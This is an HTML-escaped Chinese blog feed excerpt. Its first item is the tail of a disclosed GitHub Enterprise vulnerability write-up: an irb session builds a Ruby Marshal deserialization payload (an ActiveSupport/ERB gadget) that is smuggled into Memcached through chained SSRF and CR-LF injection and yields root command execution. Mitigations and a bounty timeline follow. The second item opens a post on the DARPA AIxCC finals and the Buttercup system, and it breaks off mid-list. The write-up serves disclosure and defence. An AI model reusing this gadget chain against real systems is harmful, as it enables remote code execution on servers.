&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;irb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;&lt;span class=&#34;mo&#34;&gt;001&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;GitHub&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cache&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;superclass&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;Memcached&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;Rails&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;irb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;&lt;span class=&#34;mo&#34;&gt;002&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;GitHub&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cache&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;nogg&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;hihihi&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;kp&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;irb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;&lt;span class=&#34;mo&#34;&gt;003&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;GitHub&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cache&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;nogg&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;hihihi&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;irb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;&lt;span class=&#34;mo&#34;&gt;004&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;GitHub&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cache&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;nogg&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;ss&#34;&gt;:raw&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;kp&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x04\b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;I&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;\v&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;hihihi&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x06&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x06&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;ET&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;irb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;&lt;span class=&#34;mo&#34;&gt;005&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;code&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;`id`&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;`id`&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;irb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;&lt;span class=&#34;mo&#34;&gt;006&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x04\x08&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;o&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x40&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x07&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x0E&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;@instance&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;o&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x08&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;ERB&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x07&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x09&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;@src&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;Marshal&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;code&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;..-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x0c&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;@lineno&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;i&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x00&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x0C&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;@method&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x0B&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;result&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;\u0004&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;o:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;:\u000E@instanceo:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;ERB&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;@srcI&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;\t&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;`id`\u0006:\u0006ET:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;@linenoi\u0000:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\f&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;@method:&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\v&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;result&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;irb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;&lt;span class=&#34;mo&#34;&gt;007&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;GitHub&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cache&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;nogg&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;payload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;60&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;ss&#34;&gt;:raw&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&#34;kp&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;kp&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;irb&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;&lt;span class=&#34;mo&#34;&gt;00&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;GitHub&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cache&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;nogg&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;好了，让我们总结一下我们的步骤！&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;第一个SSRF - 绕过Webhook中的现有保护&lt;/li&gt;
&lt;li&gt;第二个SSRF - Graphite服务中的SSRF&lt;/li&gt;
&lt;li&gt;将第一个SSRF和第二个SSRF串联成SSRF执行链&lt;/li&gt;
&lt;li&gt;SSRF执行链中的CR-LF注入&lt;/li&gt;
&lt;li&gt;作为Memcached协议走私并插入恶意的Marshal对象&lt;/li&gt;
&lt;li&gt;触发RCE&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;漏洞利用概览&#34;&gt;漏洞利用概览
&lt;/h2&gt;&lt;p&gt;最终的漏洞利用可以在Gist上找到，视频可以在Youtube上观看。&lt;/p&gt;
&lt;h2 id=&#34;修复&#34;&gt;修复
&lt;/h2&gt;&lt;p&gt;GitHub已经做了许多改进来防止相关问题再次发生！&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;增强了Gem faraday-restrict-ip-addresses&lt;/li&gt;
&lt;li&gt;应用了自定义的Django中间件，确保攻击者无法访问http://127.0.0.1:8000/render/之外的路径&lt;/li&gt;
&lt;li&gt;增强了iptables规则，阻止带有User-Agent: GitHub-Hookshot模式的访问&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ cat /etc/ufw/before.rules
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-A ufw-before-input -m multiport -p tcp ! --dports 22,23,80,81,122,123,443,444,8080,8081,8443,8444 -m recent --tcp-flags PSH,ACK PSH,ACK --remove -m string --algo bm --string &amp;#34;User-Agent: GitHub-Hookshot&amp;#34; -j REJECT --reject-with tcp-reset
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;时间线&#34;&gt;时间线
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;2017/01/23 23:22 通过HackerOne向GitHub报告漏洞，分配报告编号200542&lt;/li&gt;
&lt;li&gt;2017/01/23 23:37 GitHub将状态更改为Triaged。&lt;/li&gt;
&lt;li&gt;2017/01/24 04:43 GitHub回应问题已验证并正在修复。&lt;/li&gt;
&lt;li&gt;2017/01/31 14:01 发布GitHub Enterprise 2.8.7。&lt;/li&gt;
&lt;li&gt;2017/02/01 01:02 GitHub回应此问题已修复！&lt;/li&gt;
&lt;li&gt;2017/02/01 01:02 GitHub奖励7,500美元赏金！&lt;/li&gt;
&lt;li&gt;2017/03/15 02:38 GitHub奖励5,000美元最佳报告奖金。&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>AIxCC决赛启动：Buttercup引领网络安全AI新浪潮</title>
        <link>http://localhost:1313/p/aixcc%E5%86%B3%E8%B5%9B%E5%90%AF%E5%8A%A8buttercup%E5%BC%95%E9%A2%86%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8ai%E6%96%B0%E6%B5%AA%E6%BD%AE/</link>
        <pubDate>Sun, 03 Aug 2025 00:20:05 +0800</pubDate>
        
        <guid>http://localhost:1313/p/aixcc%E5%86%B3%E8%B5%9B%E5%90%AF%E5%8A%A8buttercup%E5%BC%95%E9%A2%86%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8ai%E6%96%B0%E6%B5%AA%E6%BD%AE/</guid>
        <description>&lt;h1 id=&#34;以buttercup开启aixcc决赛征程&#34;&gt;以Buttercup开启AIxCC决赛征程
&lt;/h1&gt;&lt;p&gt;DARPA人工智能网络挑战赛（AIxCC）决赛正式启动，我们的网络推理系统Buttercup已整装待发！这项最初限制严格的赛事现已变得更加雄心勃勃。参赛团队现在可以构建自定义AI模型、自主控制基础设施，并同时应对多种类型的安全挑战。伴随新挑战而来的是更多资源——每项挑战的预算从半决赛的100美元提升至1000美元以上。&lt;/p&gt;
&lt;p&gt;这些改变不仅是数字上的增长，更是让参赛者能够构建更接近实用安全工具的系统，而非学术概念验证。技术方法的弹性扩展也意味着我们将看到AI在网络安全问题上更创新的应用——这些在半决赛限制下根本无法实现。&lt;/p&gt;
&lt;h2 id=&#34;预算与时间扩展&#34;&gt;预算与时间扩展
&lt;/h2&gt;&lt;p&gt;决赛最显著的改变是每支团队可用资源的大幅增加。半决赛中，参赛系统在严格限制下运行：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;时间&lt;/strong&gt;：每项挑战仅4小时分析时间&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;AI预算&lt;/strong&gt;：每项挑战仅100美元用于商业AI API调用（如ChatGPT、Claude）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;计算预算&lt;/strong&gt;：固定分配的虚拟机资源，扩展选项有限&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;决赛阶段的约束条件（可能调整）现已变为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;时间&lt;/strong&gt;：每项挑战8+小时&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;AI预算&lt;/strong&gt;：每轮10,000美元用于商业AI API调用（每轮含多项挑战）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;计算预算&lt;/strong&gt;：每轮20,000美元用于Azure资源（服务器、VM、GPU）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这些新增资源让我们能在更实际的时间框架内进行更彻底的分析。Buttercup现在能够：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;执行更深入的动态分析并对补丁进行更全面的测试&lt;/li&gt;
&lt;li&gt;扩展资源密集型任务（如模糊测试）的规模&lt;/li&gt;
&lt;li&gt;使用更多样化的商业AI模型处理更广泛的任务&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;多轮竞赛机制&#34;&gt;多轮竞赛机制
&lt;/h2&gt;&lt;p&gt;与半决赛单轮评分不同，决赛包含三轮不计分的展示赛，让团队能在最终评分轮前迭代改进其CRS系统：&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;轮次&lt;/th&gt;
          &lt;th&gt;开放时间&lt;/th&gt;
          &lt;th&gt;计分&lt;/th&gt;
          &lt;th&gt;关键参数&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;展示赛1&lt;/td&gt;
          &lt;td&gt;4月1日&lt;/td&gt;
          &lt;td&gt;不计分&lt;/td&gt;
          &lt;td&gt;2万计算预算+1万AI预算，2项挑战，最多2项并发，48小时窗口（仅差异扫描挑战）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;展示赛2&lt;/td&gt;
          &lt;td&gt;5月6日&lt;/td&gt;
          &lt;td&gt;不计分&lt;/td&gt;
          &lt;td&gt;同预算，15-30项挑战，最多4项并发，8小时差异扫描/24小时全扫描窗口&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;展示赛3&lt;/td&gt;
          &lt;td&gt;6月3日&lt;/td&gt;
          &lt;td&gt;不计分&lt;/td&gt;
          &lt;td&gt;参数待定（提前30天公布）&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;决赛轮&lt;/td&gt;
          &lt;td&gt;6月24日&lt;/td&gt;
          &lt;td&gt;计分&lt;/td&gt;
          &lt;td&gt;参数待定（提前30天公布）&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;em&gt;表1：决赛阶段竞赛结构&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;这种渐进式设计鼓励系统适应变化的需求——这是现实世界安全工具的关键品质。参赛者还能基于前几轮反馈迭代优化方案，使DEFCON 2025亮相的最终系统更加健壮。&lt;/p&gt;
&lt;h2 id=&#34;多样化挑战类型&#34;&gt;多样化挑战类型
&lt;/h2&gt;&lt;p&gt;最具技术意义的变革是引入多种挑战类型。半决赛仅有一种挑战模式——提供少于100次提交的精简git历史的真实开源软件。决赛挑战仍基于真实开源软件，但现包含：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;差异扫描挑战&lt;/strong&gt;&lt;br&gt;
